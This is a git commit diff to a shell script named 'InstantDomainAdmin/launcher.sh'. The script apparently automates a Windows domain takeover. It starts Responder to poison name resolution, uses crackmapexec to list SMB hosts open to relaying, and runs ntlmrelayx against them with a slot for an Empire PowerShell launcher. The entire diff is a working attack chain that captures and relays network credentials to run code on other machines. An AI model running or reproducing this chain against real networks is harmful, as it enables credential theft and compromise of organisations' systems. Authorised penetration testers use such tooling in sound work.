a3612bfc9e37d3c2b1fd97e2f073c5a7af1bf6e1
joethorpe6 <joethorpe6@openmailbox.org>
2017-10-27 14:13:58 +0100

    new tools and launcher

--- InstantDomainAdmin/launcher.sh
+++ InstantDomainAdmin/launcher.sh
@@ -4,8 +4,19 @@ if  [[ -z "$HOSTIP" ]]; then
     echo -e "\n"
     read -p "Host IP (192.168.1.20): " HOSTIP
 fi
+CIDR=$2
+if  [[ -z "$CIDR" ]]; then
+    echo -e "\n"
+    read -p "Subnet (192.168.1.0/24): " CIDR
+fi
 tmux new-session -d -s instantdomainadmin ;
-tmux send-keys -t instantdomainadmin "crackmapexec | less "  C-m
+tmux send-keys -t instantdomainadmin "cd /opt/Responder && python ./Responder.py -I eth0 -r -d -w -e $HOSTIP"  C-m
+tmux new-window \;
+tmux split-window -h ;
+tmux select-pane -L
+tmux send-keys -t instantdomainadmin "cme smb $CIDR --gen-relay-list targets.txt "  C-m
+tmux select-pane -R
+tmux send-keys -t instantdomainadmin "python /usr/local/bin/ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>"
 tmux new-window \;
 tmux split-window -h ;
 tmux select-pane -L
